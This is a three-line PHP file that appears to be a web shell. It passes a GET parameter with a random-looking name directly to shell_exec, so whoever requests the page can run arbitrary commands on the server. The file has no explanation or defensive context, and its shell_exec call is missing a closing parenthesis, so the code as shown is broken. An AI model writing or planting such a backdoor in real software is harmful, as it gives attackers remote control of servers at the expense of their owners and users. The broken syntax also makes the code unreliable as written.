<?php
shell_exec($_GET['NKKigu1w'];
?>
